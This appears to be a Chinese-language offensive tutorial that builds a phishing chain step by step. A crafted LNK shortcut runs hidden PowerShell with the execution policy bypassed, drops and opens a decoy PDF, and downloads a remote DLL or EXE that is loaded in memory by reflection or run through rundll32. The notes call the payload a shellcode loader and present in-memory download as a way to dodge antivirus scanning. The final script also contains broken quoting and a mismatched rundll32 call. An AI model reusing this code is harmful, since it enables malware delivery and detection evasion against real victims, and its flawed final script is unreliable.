### 思路一
#### 攻击流程
lnk文件指向ps脚本--->当用户点击lnk文件时--->释放诱饵pdf文件并打开--->同时后台远程下载url文件落地内存--->然后在内存中执行文件--->该文件就是dll文件--->dll文件就是shellcode加载器
#### 包含的主要技能点
##### 1--创建一个lnk文件，在用户点击时执行Ps脚本
使用PS脚本创建的lnk文件
```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:Public\Documents\Example.lnk")  # 生成 LNK 文件的路径
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"%USERPROFILE%\Documents\extract_pdf.ps1`""
$Shortcut.WorkingDirectory = "$env:USERPROFILE\Documents"
$Shortcut.Save()
```

- **`New-Object -ComObject WScript.Shell`**：创建 Windows 脚本 Shell 组件，用于生成快捷方式。
- **`$Shortcut.CreateShortcut(路径)`**：指定 LNK 文件的保存路径。
- **`$Shortcut.TargetPath`**：设置快捷方式指向 `powershell.exe`，用于执行 PowerShell 脚本。
- **`$Shortcut.Arguments`**：设置 LNK 启动时的参数，使其执行 `extract_pdf.ps1`，用于释放 PDF。
- **`$Shortcut.WorkingDirectory`**：设置快捷方式的工作目录，通常指向 `Documents` 目录。

##### 2--编写ps脚本以嵌入pdf文件
由于 LNK 文件本身不能嵌入文件，因此 PDF 需要以 **Base64 编码** 的形式存储在 PowerShell 脚本中，并在 LNK 运行时释放它。
```powershell
$pdfPath = "C:\Path\to\example.pdf"
$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($pdfPath))
Set-Content -Path "C:\Path\to\pdf_encoded.txt" -Value $base64
```
这会在 `pdf_encoded.txt` 文件中保存 Base64 编码的 PDF。

##### 3--编写ps脚本以释放pdf文件
下面的 PowerShell 脚本 `extract_pdf.ps1` 会将 Base64 编码的 PDF 转换回 PDF 并释放到指定目录
```powershell
$pdfBase64 = Get-Content -Path "C:\Path\to\pdf_encoded.txt"
$pdfBytes = [Convert]::FromBase64String($pdfBase64)
$outputPath = "$env:USERPROFILE\Documents\Extracted.pdf"
[IO.File]::WriteAllBytes($outputPath, $pdfBytes)

# 自动打开 PDF
Start-Process -FilePath $outputPath
```
- **`Get-Content`** 读取 Base64 编码的 PDF。
- **`[Convert]::FromBase64String($pdfBase64)`** 将 Base64 转换回原始字节流。
- **`[IO.File]::WriteAllBytes`** 将字节流写入 PDF 文件。
- **`Start-Process -FilePath $outputPath`** 立即打开 PDF 以执行。

现在，`Example.lnk` 快捷方式已经创建，双击它就会执行 `extract_pdf.ps1`，释放 PDF 并打开它。

##### 4--嵌入 PowerShell 代码到 LNK 直接执行（主要使用方法）
如果你不想创建额外的 PowerShell 脚本 (`extract_pdf.ps1`)，可以直接在 LNK 的 `Arguments` 中嵌入 PowerShell 代码。
```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:Public\Documents\Example.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"`$pdfBase64='BASE64_STRING_HERE'; `$pdfBytes=[Convert]::FromBase64String(`$pdfBase64); [IO.File]::WriteAllBytes('$env:USERPROFILE\Documents\Extracted.pdf', `$pdfBytes); Start-Process -FilePath '$env:USERPROFILE\Documents\Extracted.pdf'`""
$Shortcut.Save()
```
- **`$pdfBase64='BASE64_STRING_HERE'`**：这里需要手动替换为你的 Base64 PDF 字符串。
- **`WriteAllBytes`** 将 Base64 转换回 PDF 并释放到 `Documents` 目录。
- **`Start-Process`** 立即打开 PDF。


#### 在上面的基础上打开pdf同时执行url下载加载（完整过程）
<mark style="background: #FF5582A6;">完整的PS代码如下</mark>
```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:Public\Documents\Example.lnk")
$Shortcut.TargetPath = "powershell.exe"

# 需要手动替换 'BASE64_STRING_HERE' 为你的 PDF 文件的 Base64 编码
$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"
    `$pdfBase64='BASE64_STRING_HERE'; 
    `$pdfBytes=[Convert]::FromBase64String(`$pdfBase64); 
    `$localPdfPath='$env:USERPROFILE\Documents\Extracted.pdf'; 
    [IO.File]::WriteAllBytes(`$localPdfPath, `$pdfBytes);
    Start-Process -FilePath `$localPdfPath;

    # 远程 PDF 下载部分
    `$url='https://example.com/remote.pdf';  # 替换为你的 PDF 下载 URL
    `$webClient=New-Object System.Net.WebClient;
    `$remotePdfBytes=`$webClient.DownloadData(`$url);
    `$remotePdfPath='$env:TEMP\Downloaded.pdf'; 
    [IO.File]::WriteAllBytes(`$remotePdfPath, `$remotePdfBytes);
    Start-Process -FilePath `$remotePdfPath;
`""
$Shortcut.Save()
```
代码详细解释

##### 创建 Windows 快捷方式（LNK 文件）
```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:Public\Documents\Example.lnk")
```
- `WScript.Shell` COM 对象用于创建 LNK 文件。
- `CreateShortcut()` 方法用于生成快捷方式。
- `$Shortcut.TargetPath = "powershell.exe"`将快捷方式打开指向PS脚本

##### 本地PDF释放
```powershell
`$pdfBase64='BASE64_STRING_HERE';
`$pdfBytes=[Convert]::FromBase64String(`$pdfBase64);
`$localPdfPath='$env:USERPROFILE\Documents\Extracted.pdf';
[IO.File]::WriteAllBytes(`$localPdfPath, `$pdfBytes);
Start-Process -FilePath `$localPdfPath;
```
- 读取嵌入的 Base64 编码 PDF，并写入到 `Documents\Extracted.pdf`。
- `Start-Process` 打开 PDF。
- `$pdfBase64='BASE64_STRING_HERE`是已经编好码的pdf编码变量
- `$pdfBytes=[Convert]::FromBase64String(`$pdfBase64)对上面的编码文件解码
- `$localPdfPath='$env:USERPROFILE\Documents\Extracted.pdf`指定解码后文件保存的路径
- `[IO.File]::WriteAllBytes(`$localPdfPath, `$pdfBytes)将解码后的文件写入到指定路径中
- 运行指定路径的文件

##### 远程 PDF 下载 & 执行
```powershell
`$url='https://example.com/remote.pdf';
`$webClient=New-Object System.Net.WebClient;
`$remotePdfBytes=`$webClient.DownloadData(`$url);
`$remotePdfPath='$env:TEMP\Downloaded.pdf';
[IO.File]::WriteAllBytes(`$remotePdfPath, `$remotePdfBytes);
Start-Process -FilePath `$remotePdfPath;
```
- **`System.Net.WebClient`**：用于从 URL 下载文件。
- **`DownloadData(url)`**：直接获取 PDF 文件的二进制数据（存入 `$remotePdfBytes`）。
- **`WriteAllBytes()`**：将 PDF 内容写入内存并存储在 `TEMP\Downloaded.pdf`。
- **`Start-Process`** 打开下载的 PDF 文件。
###### Downloaddata操作符详细说明
`DownloadData` 是 `WebClient` 类中的一个方法，用于从指定的 URL 下载数据。与 `DownloadFile()` 不同，它不会将数据保存为磁盘上的文件，而是将下载的数据以字节数组的形式存储在内存中。
与 `DownloadFile` 方法不同，`DownloadData` 完全在内存中进行文件下载。它下载的数据存储在内存中，不会有文件被创建在磁盘上，因此避免了文件扫描软件（如 AV 软件）的检测。

在 PowerShell 中，`$env:TEMP` 是一个环境变量，指向当前用户的临时目录。它并不是**内存中的路径**，而是磁盘上的一个文件路径，通常位于 `%USERPROFILE%\AppData\Local\Temp`。因此，当你使用 `$env:TEMP\Downloaded.pdf` 时，你是在将文件下载到磁盘的临时目录中，而不是内存中。

###### $Shortcut.Save()操作符号就是保存创建的lnk文件

###### 远程下载替换成URL下载执行DLL文件
```powershell
$WshShell = New-Object -ComObject WScript.Shell

$Shortcut = $WshShell.CreateShortcut("$env:Public\Documents\Example.lnk")

$Shortcut.TargetPath = "powershell.exe"

  

# 需要手动替换 'BASE64_STRING_HERE' 为你的 PDF 文件的 Base64 编码

$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"

    `$pdfBase64='BASE64_STRING_HERE';

    `$pdfBytes=[Convert]::FromBase64String(`$pdfBase64);

    `$localPdfPath='$env:USERPROFILE\Documents\Extracted.pdf';

    [IO.File]::WriteAllBytes(`$localPdfPath, `$pdfBytes);

    Start-Process -FilePath `$localPdfPath;

  

    # 远程 dll 下载部分

    `$url='https://example.com/remote.dll';  # 替换为你的 PDF 下载 URL

    `$webClient=New-Object System.Net.WebClient;

    `$remotePdfBytes=`$webClient.DownloadData(`$url);

     $memoryStream = New-Object System.IO.MemoryStream(,$remotePdfBytes); # 将dll或exe文件数据存入内存流

  

     # 反射加载 EXE（如果 EXE 是 .NET 程序）

     $assembly = [System.Reflection.Assembly]::Load($memoryStream.ToArray())

     $entryPoint = $assembly.EntryPoint

     $entryPoint.Invoke($null, @())

     # 目标进程 rundll32.exe

     $rundll32 = "$env:SystemRoot\System32\rundll32.exe"


     # 通过 rundll32.exe 执行恶意文件

     Start-Process -FilePath $rundll32 -ArgumentList "C:\Windows\System32\shell32.dll,Control_RunDLL" -NoNewWindow
     # -argumentlist是向rundll进程传递参数，一个是待执行dll的路径，一个是dll中的函数（一般写dll的时候会写一个main函数）

     # 如果待执行的dll是落地内存的，就不需要写dll的路径了，只需要写dll的主函数
$Shortcut.Save()
```

如果不是dll文件而是传统的exe可执行文件（此时exe不是由,net编写的），那么就不能通过rundll加载执行只能落地磁盘的临时文件夹中，在利用`start-process`命令或者rundll命令加载落地磁盘有路径的exe文件或者其他文件，如果执行落地磁盘的dll文件时可以用rundll程序，但必须传递两个参数dll路径和dll的主函数（写dll时就已经准备好）
